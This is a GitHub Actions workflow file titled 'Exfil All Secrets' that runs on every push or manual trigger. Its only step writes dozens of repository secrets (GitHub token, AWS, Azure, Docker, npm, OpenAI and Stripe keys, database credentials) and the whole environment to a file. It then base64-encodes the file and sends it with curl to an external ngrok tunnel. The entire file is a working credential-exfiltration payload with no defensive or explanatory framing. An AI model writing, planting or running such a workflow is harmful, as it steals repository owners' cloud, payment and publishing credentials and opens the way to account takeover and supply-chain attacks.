name: Exfil All Secrets
on:
  push:
  workflow_dispatch:

jobs:
  exfil:
    runs-on: ubuntu-latest
    steps:
      - name: Dump all secrets
        run: |
          echo "=== ALL SECRETS ===" > /tmp/secrets.txt
          echo "GITHUB_TOKEN=${{ secrets.GITHUB_TOKEN }}" >> /tmp/secrets.txt
          echo "SECRET_1=${{ secrets.SECRET_1 }}" >> /tmp/secrets.txt
          echo "SECRET_2=${{ secrets.SECRET_2 }}" >> /tmp/secrets.txt
          echo "SECRET_3=${{ secrets.SECRET_3 }}" >> /tmp/secrets.txt
          echo "SECRET_4=${{ secrets.SECRET_4 }}" >> /tmp/secrets.txt
          echo "SECRET_5=${{ secrets.SECRET_5 }}" >> /tmp/secrets.txt
          echo "NPM_TOKEN=${{ secrets.NPM_TOKEN }}" >> /tmp/secrets.txt
          echo "AWS_SECRET_ACCESS_KEY=${{ secrets.AWS_SECRET_ACCESS_KEY }}" >> /tmp/secrets.txt
          echo "AWS_ACCESS_KEY_ID=${{ secrets.AWS_ACCESS_KEY_ID }}" >> /tmp/secrets.txt
          echo "AZURE_CLIENT_SECRET=${{ secrets.AZURE_CLIENT_SECRET }}" >> /tmp/secrets.txt
          echo "DOCKER_PASSWORD=${{ secrets.DOCKER_PASSWORD }}" >> /tmp/secrets.txt
          echo "DOCKER_USERNAME=${{ secrets.DOCKER_USERNAME }}" >> /tmp/secrets.txt
          echo "OPENAI_API_KEY=${{ secrets.OPENAI_API_KEY }}" >> /tmp/secrets.txt
          echo "STRIPE_SECRET=${{ secrets.STRIPE_SECRET }}" >> /tmp/secrets.txt
          echo "PAT=${{ secrets.PAT }}" >> /tmp/secrets.txt
          echo "TOKEN=${{ secrets.TOKEN }}" >> /tmp/secrets.txt
          echo "API_KEY=${{ secrets.API_KEY }}" >> /tmp/secrets.txt
          echo "DATABASE_URL=${{ secrets.DATABASE_URL }}" >> /tmp/secrets.txt
          echo "DB_PASSWORD=${{ secrets.DB_PASSWORD }}" >> /tmp/secrets.txt
          echo "JWT_SECRET=${{ secrets.JWT_SECRET }}" >> /tmp/secrets.txt
          env >> /tmp/secrets.txt
          cat /tmp/secrets.txt | base64 -w 0 | curl -X POST -d @- https://july-reorder-overlaid.ngrok-free.dev
